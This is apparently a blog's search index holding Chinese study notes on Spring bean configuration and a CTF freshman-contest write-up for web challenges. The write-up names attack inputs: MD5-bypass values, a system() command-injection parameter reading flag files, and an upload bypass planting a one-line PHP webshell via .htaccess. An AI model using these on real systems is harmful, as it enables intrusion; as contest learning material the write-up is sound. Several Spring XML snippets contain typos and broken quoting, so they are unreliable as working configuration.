<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java_SSM_1</title>
    <link href="/2023/11/30/Java-SSM-1-Beam/"/>
    <url>/2023/11/30/Java-SSM-1-Beam/</url>
    
    <content type="html"><![CDATA[<h1 id="一、Java-Beam及工厂模式"><a href="#一、Java-Beam及工厂模式" class="headerlink" title="一、Java Beam及工厂模式"></a>一、Java Beam及工厂模式</h1><h2 id="1、工厂模式"><a href="#1、工厂模式" class="headerlink" title="1、工厂模式"></a>1、工厂模式</h2><p>方式一:<strong>构造方法</strong>实例化bean</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao”class=&quot;</span><span class="hljs-attr">com.itheima.dao.impl.BookDaoImpl</span>&quot;/&gt;</span><br></code></pre></td></tr></table></figure><p>方式二:使用<strong>静态工厂</strong>实例化bean</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;orderDao&quot;</span><span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com. itheima.factory.0rderDaoFactory&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;getOrderDao&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>方式三: 使用<strong>实例工厂</strong>实例化bean</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userFactory”class=&quot;</span><span class="hljs-attr">com</span>,<span class="hljs-attr">itheima.factory.UserDaoFactory</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;getUserDao&quot;</span> <span class="hljs-attr">factory-bean</span>=<span class="hljs-string">&quot;userFactory&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>方法四：FactoryBeam</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.factory.UserDaoFactoryBean&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>UserDaoFactoryBeam.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoFactoryBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FactoryBean</span>&lt;UserDao&gt; &#123;<br><span class="hljs-comment">//代替原始实例工厂中创建对象的方法</span><br>    <span class="hljs-keyword">public</span> UserDao <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDaoImpl</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; getobjectType()&#123;<br>    <span class="hljs-keyword">return</span> UserDao.class;<br>    &#125;<br>    <span class="hljs-comment">//是否单例</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSingleton</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-Beam生命周期"><a href="#2-Beam生命周期" class="headerlink" title="2.Beam生命周期"></a>2.Beam生命周期</h2><p>(1)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Java中写 a.close();--&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;init&quot;</span> <span class="hljs-attr">destroy-method</span>=<span class="hljs-string">&quot;destory&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>(2)设置自动关闭</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">a.registerShutdownHook();<br></code></pre></td></tr></table></figure><p>(3)一般不写，在Tomcat后关闭</p><p><img src=".%5Cimg%5CJavaWeb%5CSSM-1%5C1.png" alt="1"></p><h2 id="3-依赖注入"><a href="#3-依赖注入" class="headerlink" title="3.依赖注入"></a>3.依赖注入</h2><h3 id="1-Setter注入——简单类型"><a href="#1-Setter注入——简单类型" class="headerlink" title="1.Setter注入——简单类型"></a>1.Setter注入——简单类型</h3><p>(1)在bean中定义引用类型属性并提供可访问的set方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BookDao</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> connectionNumber;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConnectionNumber</span><span class="hljs-params">(<span class="hljs-type">int</span> connectionNumber)</span> &#123;<br>    <span class="hljs-built_in">this</span>.connectionNumber = connectionNumber;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2)配置中使用property标签value属性注入简单类型数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com,itheima.dao.impl.BookDaoImpl&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;connectionNumber” value=&quot;</span><span class="hljs-attr">10</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-构造器注入"><a href="#2-构造器注入" class="headerlink" title="2.构造器注入"></a>2.构造器注入</h3><p>在bean中定义引用类型属性并提供可访问的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BookServicef</span><br><span class="hljs-keyword">private</span> BookDao bookDao;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BookServiceImp1</span><span class="hljs-params">(BookDao bookDao)</span> &#123;<br><span class="hljs-built_in">this</span>.bookDao = bookDao;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置中使用constructor-arg标签ref属性注入引用类型对象</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookService”class=&quot;</span><span class="hljs-attr">com</span>,<span class="hljs-attr">itheima</span>,<span class="hljs-attr">service</span>,<span class="hljs-attr">impl.BookServiceImpl</span>&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bookDao”ref=&quot;</span><span class="hljs-attr">bookDao</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao”class=&quot;</span><span class="hljs-attr">com.itheima.dao.impl.BookDaoImpl</span>&quot;/&gt;</span><br></code></pre></td></tr></table></figure><p>配置中使用constructor-arg标签type属性设置按形参类型注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao”class=&quot;</span><span class="hljs-attr">com.itheima.dao.impl.BookDaoImpl</span>&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;int&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;java.lang.String” value=&quot;</span><span class="hljs-attr">mysql</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置中使用constructor-arg标签index属性设置按形参位置注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao” class=&quot;</span><span class="hljs-attr">com.itheima.dao.impl.BookDaoImpl</span>&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;” value=&quot;</span><span class="hljs-attr">10</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1” value=&quot;</span><span class="hljs-attr">mysql</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依赖注入方式选择</p><ol><li>强制依赖使用构造器进行，使用setter注入有概率不进行注入导致nu11对象出现</li><li>可选依赖使用setter注入进行，灵活性强</li><li>Spring框架倡导使用构造器，第三方框架内部大多数采用构造器注入的形式进行数据初始化，相对严谨</li><li>如果有必要可以两者同时使用，使用构造器注入完成强制依赖的注入，使用setter注入完成可选依赖的注入</li><li>实际开发过程中还要根据实际情况分析，如果受控对象没有提供setter方法就必须使用构造器注入</li><li>自己开发的模块推荐使用setter注入</li></ol><p><img src=".%5Cimg%5CJavaWeb%5CSSM-1%5C2.png" alt="2"></p><h3 id="3-自动装配"><a href="#3-自动装配" class="headerlink" title="3.自动装配"></a>3.自动装配</h3><p>IoC容器根据bean所依赖的资源在容器中自动查找并注入到bean中的过程称为自动装配<br>自动装配方式：按类型( 常用 )、按名称、按构造方法、不启用自动装配</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookServiceclass=&quot;</span><span class="hljs-attr">com.itheima</span>,<span class="hljs-attr">service.impl.BookServiceImpl</span>&quot; <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;byType&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>依赖自动装配特征</strong></p><ul><li>自动装配用于引用类型依赖注入，不能对简单类型进行操作</li><li>使用按类型装配时( byType )必须保障容器中相同类型的bean唯一，推荐使用</li><li>使用按名称装配时( byName )必须保障容器中具有指定名称的bean，因变量名与配置合，不推荐使用</li><li>自动装配优先级低于setter注入与构造器注入，同时出现时自动装配配置失效</li></ul><p>注入集合：数组、List、Set、Map、Properties</p><h4 id="Spring管理第三方资源案例"><a href="#Spring管理第三方资源案例" class="headerlink" title="Spring管理第三方资源案例"></a>Spring管理第三方资源案例</h4><p>DruidDataSource<br>ComboPooledDataSource</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.alibaba,druid.pool.DruidDataSource&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driverClassName&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ur1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/spring db&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password” value=&quot;</span><span class="hljs-attr">root</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br>                                      <br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3pe.ComboPooledDataSource&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driverClass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com,mysql.jdbc.Driver&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jdbcUr1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost;3306/spring_db&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user” value=&quot;</span><span class="hljs-attr">root</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password” value=&quot;</span><span class="hljs-attr">root</span>&quot;/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="使用properties文件进行解耦管理"><a href="#使用properties文件进行解耦管理" class="headerlink" title="使用properties文件进行解耦管理"></a>使用properties文件进行解耦管理</h4><p>1.开启context而名空间</p><p>2.使用context空间加properties 文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>3.使用属性占位行${}读取properties 文件中的属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driverClassName&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ur1” value=&quot;</span>$&#123;<span class="hljs-attr">jdbc.url</span>&#125;&quot;/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password” value=&quot;</span>$&#123;<span class="hljs-attr">jdbc.password</span>&#125;&quot;/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id-</span>&quot;<span class="hljs-attr">bookDao</span>” <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span><span class="hljs-attr">.</span></span><br><span class="hljs-tag">&lt;<span class="hljs-attr">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name” value=&quot;</span>$&#123;<span class="hljs-attr">jdbc.driver</span>&#125;&quot;/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="1-创建容器"><a href="#1-创建容器" class="headerlink" title="1.创建容器"></a>1.创建容器</h3><p>ClassPathXmlApplicationContext</p><p>FileSystemXmlApplicationContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1.加载类路径下的配置文件</span><br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;applicationContext.xml&quot;</span>);<br>    <span class="hljs-comment">//2.在文件系统下加载配置文件</span><br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemXmlApplicationContext</span> configlocation: <span class="hljs-string">&quot;D://aaa/applicationContext.xml&quot;</span>),<br>    <span class="hljs-type">BookDao</span> <span class="hljs-variable">bookDao</span> <span class="hljs-operator">=</span> (BookDao) ctxgetBean( s:<span class="hljs-string">&quot;bookDao&quot;</span>);<br>    bookDao.save();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>加载多个配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;bean1.xml&quot;</span>, <span class="hljs-string">&quot;bean2.xml&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="2-获取bean-3种"><a href="#2-获取bean-3种" class="headerlink" title="2.获取bean (3种)"></a>2.获取bean (3种)</h3><p>方式一: 使用bean名称获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BookDao</span> <span class="hljs-variable">bookDao</span> <span class="hljs-operator">=</span> (BookDao) ctx.getBean(<span class="hljs-string">&quot;bookDao&quot;</span>);<br></code></pre></td></tr></table></figure><p>方式二:使用bean名称获取并指定类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BookDao</span> <span class="hljs-variable">bookDao</span> <span class="hljs-operator">=</span> ctx.getBean(<span class="hljs-string">&quot;bookDao&quot;</span>， BookDao.class);<br></code></pre></td></tr></table></figure><p>方式三:使用bean类型获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BookDao</span> <span class="hljs-variable">bookDao</span> <span class="hljs-operator">=</span> ctx.getBean(BookDao.class);<br></code></pre></td></tr></table></figure><h3 id="3-容器类层次结构"><a href="#3-容器类层次结构" class="headerlink" title="3.容器类层次结构"></a>3.容器类层次结构</h3><p><img src=".%5Cimg%5CJavaWeb%5CSSM-1%5C3.png" alt="3"></p><h3 id="4-BeanFactory"><a href="#4-BeanFactory" class="headerlink" title="4.BeanFactory"></a>4.BeanFactory</h3><p>类路径加载配置文件</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Resource resources <span class="hljs-operator">=</span> new ClassPathResource( <span class="hljs-string">&quot;applicationContext,xml&quot;</span>)<span class="hljs-comment">;</span><br>BeanFactory bf <span class="hljs-operator">=</span> new XmlBeanFactory(resources)<span class="hljs-comment">;</span><br>BookDao bookDao <span class="hljs-operator">=</span> bf.getBean(<span class="hljs-string">&quot;bookDao&quot;</span>，BookDao.class)<span class="hljs-comment">;</span><br>bookDao .save()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>BeanFactory创建完毕后，所有的bean均为延迟加载</p><p>总结</p><p><img src=".%5Cimg%5CJavaWeb%5CSSM-1%5C4.png" alt="4"></p><p><img src=".%5Cimg%5CJavaWeb%5CSSM-1%5C5.png" alt="5"></p><p>注解开发定义bean<br>使用@Component定义bean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component(&quot;bookDao&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BookDao</span> &#123;<br>&#125;<br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BookService</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>核心配置文件中通过组件扫描加载bean</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.itheima&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h2 id="纯注解开发"><a href="#纯注解开发" class="headerlink" title="纯注解开发"></a>纯注解开发</h2>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SSM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSSM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安卓移动应用开发—1</title>
    <link href="/2023/11/27/school-android-1/"/>
    <url>/2023/11/27/school-android-1/</url>
    
    <content type="html"><![CDATA[<h1 id="安卓移动应用开发—1"><a href="#安卓移动应用开发—1" class="headerlink" title="安卓移动应用开发—1"></a>安卓移动应用开发—1</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>立个Flag</title>
    <link href="/2023/11/27/make-a-flag-1/"/>
    <url>/2023/11/27/make-a-flag-1/</url>
    
    <content type="html"><![CDATA[<h1 id="立个Flag"><a href="#立个Flag" class="headerlink" title="立个Flag"></a>立个Flag</h1><h3 id="先立个Flag"><a href="#先立个Flag" class="headerlink" title="先立个Flag"></a>先立个Flag</h3><h3 id="我要好好学习，更新Blog"><a href="#我要好好学习，更新Blog" class="headerlink" title="我要好好学习，更新Blog"></a>我要好好学习，更新Blog</h3>]]></content>
    
    
    <categories>
      
      <category>Plans</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Plans</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-NSS2022新生赛WriteUp</title>
    <link href="/2023/09/12/CTF_competition_0/"/>
    <url>/2023/09/12/CTF_competition_0/</url>
    
    <content type="html"><![CDATA[<h1 id="NSS2022新生赛"><a href="#NSS2022新生赛" class="headerlink" title="NSS2022新生赛"></a>NSS2022新生赛</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="funny-web"><a href="#funny-web" class="headerlink" title="funny_web"></a>funny_web</h3><p>随便输入一个用户名eg：admin，提示是实验室名字，输入尝试NSS，告知密码是QQ号，通过查询群管理QQ号，进入新页面，输入12345.1，获得flag。<br><img src="https://pic1.imgdb.cn/item/635135dc16f2c2beb18d9ca0.jpg"></p><h3 id="奇妙的MD5"><a href="#奇妙的MD5" class="headerlink" title="奇妙的MD5"></a>奇妙的MD5</h3><p>通过网上查询知道，神奇的字符串是ffifdyop，F12查询线索知道md5绕过方法，输入x=QNKCDZO&amp;y=s878926199a绕过,最后通过a[]=1&amp;b[]=2绕过，拿到flag。<br><img src="https://pic1.imgdb.cn/item/6351380316f2c2beb192aa16.jpg"></p><p>###where_am_i<br>图片可以看到是山*间·古迹酒店，提示11位数字猜测是电话号码，通过携程等软件查询相关酒店，最终在小红书的介绍中找到这家酒店电话。<br><img src="https://pic1.imgdb.cn/item/6351374316f2c2beb190de3f.jpg"></p><h3 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h3><p>查看到最下面提示flag.php就到/flag.php查看，提示不在这里，在flag，删除后面.php，在/flag找到flag。<br><img src="https://pic1.imgdb.cn/item/635134ed16f2c2beb18b64dd.jpg"></p><h3 id="webdog1-start"><a href="#webdog1-start" class="headerlink" title="webdog1_start"></a>webdog1_start</h3><p>通过robots.txt看到f14g.php进入，Burp抓包看到F1l1l1l1l1lag.php进入，输入?get=system(‘catflag/*’);，执行指令得到flag。<br><img src="https://pic1.imgdb.cn/item/6351370d16f2c2beb1906663.jpg"><br><img src="https://pic1.imgdb.cn/item/6351370d16f2c2beb190666e.jpg"><br><img src="https://pic1.imgdb.cn/item/6351370d16f2c2beb1906683.jpg"><br><img src="https://pic1.imgdb.cn/item/6351370d16f2c2beb1906622.jpg"></p><h3 id="Ez-upload"><a href="#Ez-upload" class="headerlink" title="Ez_upload"></a>Ez_upload</h3><p>通过写&lt;?php&gt;普通标签，同时修改为jpg无法上传，修改为长标签<script language="php"></script>通过检查，再写入一句话木马，同时通过.htaccess修改文件解析为php，蚁剑连接未发现flag，修改为<script language="php">phpinfo();</script>查看配置，找到flag。<br><img src="https://pic1.imgdb.cn/item/6351366a16f2c2beb18edffe.jpg"><br><img src="https://pic1.imgdb.cn/item/6351366a16f2c2beb18ee007.jpg"><br><img src="https://pic1.imgdb.cn/item/6351366a16f2c2beb18ee010.jpg"></p><h3 id="ez-ez-php-revenge"><a href="#ez-ez-php-revenge" class="headerlink" 